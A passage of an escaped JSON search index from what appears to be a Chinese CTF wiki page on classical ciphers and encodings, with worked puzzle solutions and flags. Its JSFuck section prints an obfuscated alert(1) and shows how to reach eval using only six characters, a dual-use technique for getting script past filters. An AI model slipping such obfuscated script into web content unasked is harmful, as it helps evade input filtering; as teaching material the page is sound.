\u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\n\n\n\n\n8842101220480224404014224202480122\n\n\n\n\n\u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u5185\u5bb9\n\n\n\u6570\u5b57\n\n\n\u5b57\u7b26\n\n\n\n\n\n\n\n\n\n\n88421\n\n\n8+8+4+2+1=23\n\n\nW\n\n\n\n\n\n\n122\n\n\n1+2+2=5\n\n\nE\n\n\n\n\n\n\n48\n\n\n4+8=12\n\n\nL\n\n\n\n\n\n\n2244\n\n\n2+2+4+4=12\n\n\nL\n\n\n\n\n\n\n4\n\n\n4\n\n\nD\n\n\n\n\n\n\n142242\n\n\n1+4+2+2+4+2=15\n\n\nO\n\n\n\n\n\n\n248\n\n\n2+4+8=14\n\n\nN\n\n\n\n\n\n\n122\n\n\n1+2+2=5\n\n\nE\n\n\n\n\n\n\n\n\n\u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002\n\n\nJSFuck\n\n\n\u539f\u7406\n\n\nJSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26 \n[]()!+\n \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0 \nalert(1)\n \u4ee3\u7801\u5982\u4e0b\n\n\n[][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]][([][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]((\n!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]\n+\n[])[\n+\n[[\n+!+\n[]]]\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n[\n+!+\n[]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n([][[]]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]]]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[[\n+!+\n[]]]]]\n+\n[])[\n+\n[[\n+!+\n[]]]\n+\n[[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]])()\n\n\n\n\n\n\u5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a\n\n\nfalse\n       \n=\n  \n!\n[]\n\n\ntrue\n        \n=\n  \n!!\n[]\n\n\nundefined\n   \n=\n  \n[][[]]\n\n\nNaN\n         \n=\n  \n+\n[\n!\n[]]\n\n\n0\n           \n=\n  \n+\n[]\n\n\n1\n           \n=\n  \n+!+\n[]\n\n\n2\n           \n=\n  \n!+\n[]\n+!+\n[]\n\n\n10\n          \n=\n  \n[\n+!+\n[]]\n+\n[\n+\n[]]\n\n\nArray\n       \n=\n  \n[]\n\n\nNumber\n      \n=\n  \n+\n[]\n\n\nString\n      \n=\n  \n[]\n+\n[]\n\n\nBoolean\n     \n=\n  \n!\n[]\n\n\nFunction\n    \n=\n  \n[][\nfilter\n]\n\n\neval\n        \n=\n  \n[][\nfilter\n][\nconstructor\n](\n \nCODE\n \n)()\n\n\nwindow\n      \n=\n  \n[][\nfilter\n][\nconstructor\n](\nreturn this\n)()\n\n\n\n\n\n\u5de5\u5177\n\n\n\n\nJSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9\n\n\n\n\nBrainFuck\n\n\n\u539f\u7406\n\n\nBrainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002\n\n\n++++++++++[\n+++++++\n++++++++++\n+++\n+\n-]\n\n++.\n+.+++++++..+++.\n++.\n+++++++++++++++.\n\n.+++.------.--------.\n+.\n.\n\n\n\n\n\u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002\n\n\n\u5de5\u5177\n\n\n\n\nhttps://www.splitbrain.org/services/ook\n\n\n\n\n\u732a\u5708\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b\n\n\n\n\n\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a \nX marks the spot\n \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b\n\n\n\n\n\u5de5\u5177\n\n\n\n\nhttp://www.simonsingh.net/The_Black_Chamber/pigpen.html\n\n\n\n\n\u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002\n\n\n\n\n\u952e\u76d8\u5bc6\u7801\n\n\n\u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002\n\n\n\u624b\u673a\u952e\u76d8\u5bc6\u7801\n\n\n\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64\n\n\n\n\n\u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002\n\n\n\u7535\u8111\u952e\u76d8\u68cb\u76d8\n\n\n\u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002\n\n\n\n\n\u7535\u8111\u952e\u76d8\u5750\u6807\n\n\n\u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613 \n\n\n\n\n\u7535\u8111\u952e\u76d8 QWE\n\n\n\u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002\n\n\n\n\n\u952e\u76d8\u5e03\u5c40\u52a0\u5bc6\n\n\n\u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002\n\n\n0CTF 2014 classic\n\n\n\n\n\u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb\n\n\n\n\n\u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002\n\n\n2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba\n\n\n\n\n\u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002\n\n\n23731263111628163518122316391715262121\n\n\n\u5bc6\u7801\u683c\u5f0fxman{flag}\n\n\n\n\n\u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f\n\n\n\n\n23-x\n\n\n73-m\n\n\n12-a\n\n\n63-n\n\n\n11-q\n\n\n\n\n\u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f \nxman{\n\uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f \n{\n\uff0c\u4e8e\u662f\u770b\u4e86\u770b \n{\n \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f \n{\n\u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a \n}\n \u5373\u53ef\u5f97\u5230 flag\u3002\n\n\nxman{hintisenough}\n\n\n\n\n\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002\n\n\n\u9898\u76ee\n\n\n\n\n\u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1", 
            "title": "\u5176\u4ed6\u7c7b\u578b\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/classical/others/#_1", 
            "text": "", 
            "title": "\u57f9\u6839\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_2", 
            "text": "\u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002     a  AAAAA  g  AABBA  n  ABBAA  t  BAABA      b  AAAAB  h  AABBB  o  ABBAB  u-v  BAABB    c  AAABA  i-j  ABAAA  p  ABBBA  w  BABAA    d  AAABB  k  ABAAB  q  ABBBB  x  BABAB    e  AABAA  l  ABABA  r  BAAAA  y  BABBA    f  AABAB  m  ABABB  s  BAAAB  z  BABBB     \u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002  \u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a  T o en co de  a  mes s age e ac h letter  of  the  pl a i nt ex t  i s replaced b y a g rou p of f i ve  of  th e lett ers   'A'  o r 'B' .  \u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9   \u53ea\u6709\u4e24\u79cd\u5b57\u7b26  \u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5   \u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_3", 
            "text": "http://rumkin.com/tools/cipher/baconian.php", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/#_4", 
            "text": "", 
            "title": "\u6805\u680f\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_5", 
            "text": "\u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50  \u660e\u6587\uff1aTHERE IS A CIPHER  \u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a  THEREISACIPHER  \u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230  TH ER EI SA CI PH ER  \u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd  TEESCPE\nHRIAIHR  \u8fde\u5728\u4e00\u8d77\u5c31\u662f  TEESCPEHRIAIHR  \u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002  THEREIS ACIPHER  \u7ec4\u5408\u5f97\u5230\u5bc6\u6587  TAHCEIRPEHIESR", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_6", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/#_7", 
            "text": "", 
            "title": "\u66f2\u8def\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_8", 
            "text": "\u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50  \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog  \u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09   \u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09   \u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_9", 
            "text": "", 
            "title": "\u5217\u79fb\u4f4d\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/classical/others/#_10", 
            "text": "\u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002  \u6211\u4eec\u4ee5\u660e\u6587  The quick brown fox jumps over the lazy dog \uff0c\u5bc6\u94a5  how are u  \u4e3a\u4f8b\uff1a  \u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09   \u5bc6\u94a5\uff1a  how are u \uff0c\u6309  how are u  \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a   \u5bc6\u6587\uff1a  qoury inpho Tkool hbxva uwmtd cfseg erjez", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_11", 
            "text": "http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/  \u884c\u5217\u6570\u76f8\u7b49", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/#01248", 
            "text": "", 
            "title": "01248 \u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_12", 
            "text": "\u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1- 26 \u8868\u793a A- Z\u3002  \u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9   \u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_13", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 \u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee   8842101220480224404014224202480122   \u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b     \u5185\u5bb9  \u6570\u5b57  \u5b57\u7b26      88421  8+8+4+2+1=23  W    122  1+2+2=5  E    48  4+8=12  L    2244  2+2+4+4=12  L    4  4  D    142242  1+4+2+2+4+2=15  O    248  2+4+8=14  N    122  1+2+2=5  E     \u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/classical/others/#jsfuck", 
            "text": "", 
            "title": "JSFuck"
        }, 
        {
            "location": "/crypto/classical/others/#_14", 
            "text": "JSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26  []()!+  \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0  alert(1)  \u4ee3\u7801\u5982\u4e0b  [][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]][([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( 